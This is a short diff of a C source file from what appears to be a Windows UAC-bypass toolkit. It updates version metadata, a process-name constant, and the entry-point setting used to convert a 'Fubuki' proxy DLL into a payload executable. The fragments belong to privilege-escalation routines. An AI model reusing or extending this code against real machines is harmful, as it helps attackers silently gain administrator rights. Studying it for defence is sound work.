@@ -4,9 +4,9 @@
 *
 *  TITLE:       AZAGARAMPUR.C
 *
-*  VERSION:     3.70
+*  VERSION:     3.71
 *
-*  DATE:        07 May 2026
+*  DATE:        23 Jul 2026
 *
 *  UAC bypass methods from AzAgarampur.
 *
@@ -157,7 +157,7 @@ NTSTATUS ucmNICPoisonMethod(
 
                 Sleep(2000);
 
-                if (FALSE == supIsProcessRunning(TEXT("ngentask.exe"))) {
+                if (FALSE == supIsProcessRunning(NGENTASK_EXE)) {
 
                     if (ucmxNgenLogLastWrite(&checkTime)) {
 
@@ -357,10 +357,13 @@ NTSTATUS ucmIeAddOnInstallMethod(
 
     do {
 
+        //
+        // Convert Fubuki into payload exe.
+        //
         if (!supReplaceDllEntryPoint(
             ProxyDll,
             ProxyDllSize,
-            FUBUKI_DEFAULT_ENTRYPOINT,
+            FUBUKI_EXE_ENTRYPOINT,
             TRUE))
         {
             break;
